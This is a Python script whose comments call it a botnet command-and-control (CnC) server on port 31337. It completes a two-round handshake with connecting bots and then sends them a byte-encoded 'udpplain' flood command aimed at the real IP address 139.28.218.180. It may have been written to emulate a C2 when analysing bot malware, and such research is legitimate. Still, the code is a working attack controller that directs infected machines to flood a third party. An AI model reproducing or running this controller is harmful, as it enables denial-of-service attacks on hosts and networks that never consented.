import asyncio
import struct
import time
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import List

app = FastAPI()

# checksum计算
def calculate_checksum(data: bytes) -> int:
    total_sum = 0
    for i in range(0, len(data), 2):
        if i + 2 <= len(data):
            total_sum += struct.unpack_from('!H', data, i)[0]
    
    high_word = (total_sum >> 16) & 0xFFFF
    low_word = total_sum & 0xFFFF
    carry = (high_word + low_word) >> 16
    
    return (high_word + low_word + carry) & 0xFFFF

# 构造第一轮响应数据
def build_first_round_response() -> bytes:
    response = bytearray(255)
    
    response[:4] = b'\x69\x7a\x69\x7a'  # 0x7a69, 0x7a69
    struct.pack_into('!I', response, 4, 0x000070f1)  # valid flag1
    struct.pack_into('!I', response, 8, 0x00004819)  # valid flag2
    
    response[12:16] = b'\x00\x00\x03\x00'
    
    checksum = calculate_checksum(response[:16])
    print(f"第一轮：0x{checksum:04x}")
    struct.pack_into('!H', response, 20, checksum)  # 小端序写入校验和
    
    return response

# 构造第二轮响应数据
def build_second_round_response() -> bytes:
    response = bytearray(255)
    
    response[:4] = b'\x69\x7a\x69\x7a'  # 0x7a69, 0x7a69
    struct.pack_into('!I', response, 4, 0x0002775)  # valid flag1
    struct.pack_into('!I', response, 8, 0x000070f2)  # valid flag2
    
    response[12:16] = b'\x00\x00\x03\x00'
    
    checksum = calculate_checksum(response[:16])
    print(f"第二轮：0x{checksum:04x}")
    struct.pack_into('!H', response, 20, checksum)  # 小端序写入校验和
    
    return response

# handle TCP 连接
async def handle_connection(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        # 第一轮：接收数据并响应
        first_round_data = await reader.read(255)
        print(f"Received first round data from client: {first_round_data[:16].hex()}")
        
        first_response = build_first_round_response()
        writer.write(first_response)
        await writer.drain()
        print("Sent first round response to client.")
        
        await asyncio.sleep(0.1)
        
        # 第二轮：接收数据并响应
        second_round_data = await reader.read(255)
        print(f"Received second round data from client: {second_round_data[:16].hex()}")
        
        second_response = build_second_round_response()
        writer.write(second_response)
        await writer.drain()
        print("Sent second round response to client.")
        
        await asyncio.sleep(0.1)
        
        # udp plain 指令在此
        data_for_58 = bytes([
            0x02, 0x00, 0x4a, 0x00, 0x06, 0x00, 0x01, 0x00, 0x08, 0x00, 0x04, 0x00, 0x75, 0x64, 0x70, 0x70,
            0x6c, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x0e, 0x00, 0x06, 0x00, 0x31, 0x33,
            0x39, 0x2e, 0x32, 0x38, 0x2e, 0x32, 0x31, 0x38, 0x2e, 0x31, 0x38, 0x30, 0x00, 0x00, 0x00, 0x00,
            0x02, 0x00, 0x01, 0x00, 0x0c, 0x00, 0x50, 0x00, 0x02, 0x00, 0x01, 0x00, 0x05, 0x00, 0x64, 0x00,
        ])
        
        for command in [0x00, 0x01, 0x02]:
            if command == 0x02:
                writer.write(data_for_58)
                print(f"Sent command 0x{command:02x} with data to client")
            else:
                writer.write(bytes([command]))
                print(f"Sent command 0x{command:02x} to client")
            
            await writer.drain()
            await asyncio.sleep(0.1)
            
            bot_data = await reader.read(255)
            print(f"Received bot response for command 0x{command:02x}: {bot_data[:16].hex()}")
    
    except Exception as e:
        print(f"Error handling connection: {e}")
    finally:
        writer.close()

'''
    创建CnC服务器, port=31337
'''
async def start_tcp_server():
    server = await asyncio.start_server(
        handle_connection, '0.0.0.0', 31337)
    print("Server running on port 31337")
    async with server:
        await server.serve_forever()

'''
    api接口
'''
@app.get("/start-tcp-server")
async def start_tcp_server_api():
    asyncio.create_task(start_tcp_server())
    return {"status": "success", "message": "TCP server started on port 31337"}

#测试
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=12138)